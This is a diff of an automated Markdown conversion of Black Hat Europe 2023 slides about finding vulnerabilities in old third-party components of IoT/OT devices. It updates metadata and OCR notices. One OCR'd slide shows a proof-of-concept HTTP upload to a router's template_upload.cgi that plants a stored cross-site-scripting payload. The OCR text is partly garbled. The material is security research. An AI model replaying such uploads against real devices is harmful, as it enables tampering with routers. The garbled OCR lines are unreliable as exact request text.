@@ -8,18 +8,24 @@ year: 2023
 source_pdf: "Black Hat Europe 2023 slides/Stanislav Dashevskyi, Francesco La Spina_Old Code Dies Hard Finding New Vulnerabilities in Old Third-Party Software Components and the Importance of Having SBoM for IoTOT Devices.pdf"
 pages: 48
 sha256: "df4d557706cae38fecd41e485ea8fa7005bcae53fa5099eed6bc270767e9e13c"
-text_chars: 19065
+text_chars: 18416
 ocr_pages: 2
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 87.6
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:13:13Z"
+converted_at: "2026-08-12T04:04:42Z"
 ---
 # Old Code Dies Hard Finding New Vulnerabilities in Old Third-Party Software Components and the Importance of Having SBoM for IoTOT Devices
 
 **Speakers:** Stanislav Dashevskyi, Francesco La Spina  
 **Conference:** Black Hat Europe 2023  
 **Source:** `Black Hat Europe 2023 slides/Stanislav Dashevskyi, Francesco La Spina_Old Code Dies Hard Finding New Vulnerabilities in Old Third-Party Software Components and the Importance of Having SBoM for IoTOT Devices.pdf` (48 pages)
+
 
 ## Slide 1
 
@@ -171,10 +177,10 @@ Information Classification: General
 
 Information Classification: General
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Q
 black hat
 1. Obtaining devices and
 firmware/software
@@ -419,37 +425,26 @@ Information Classification: General
 
 Information Classification: General
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-piSekhat
-QO ®& 192.168.56.129:108¢/admin/ACEmanagerx.html
 POST /cgi-bin/template_upload.cgi HTTP/1.1
 Host: 192.168.56.129:1080
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0
 Accept: */*
-Accept-Language: en-US, en; q=0.5
 Accept-Encoding: gzip, deflate
-X-CSRF-Token: 1ofbd63b58575ded96c5e344d74c5e9d
 X-Requested-With: XMLHttpRequest
 Content-Type: multipart/Torm-data; boundary=---------------------------36403764903309292865293292283
 Content-Length: 386
-Origin: http: //192.168.56.129:1080
 Connection: keep-alive
 Referer: http://192.168.56.129:1080/admin/ACEmanagerX. html
-Cookie: token=/9beec58T4ro3d764eeb653e/39T88ic: csrf-token=15fbd63b585 /58ed96c5e344d74c5e9d
-pcooss cosas eoenoseeessscoRgC0 36403764903309292865293292283
 Content-Disposition: form-data; name="upload-file"; filename="ACEmanagerX. html"
-Content-Type: text/html ———_— = oo
 <?xml version=
 Jentmi> |
 <body> =
-j<ing src="https://rb.gy/qauer"/>
 <img sre="devnull" onerror="alert("ALL YOUR ROUTER BELONGS TO US')"/>
-</body> ] Ss
 </html>
-SUTLaLAUnEaeatainenaeatalaunEalacaineneaEabnmeaeaEneai 36403764903309292865293292283 - -
-HTTP/1.1 2080 OK a
 Date: Mon, @2 Oct 2023 13:24:16 GMT
 Connection: close
 X-Frame-Options: SAMEQRIGIN
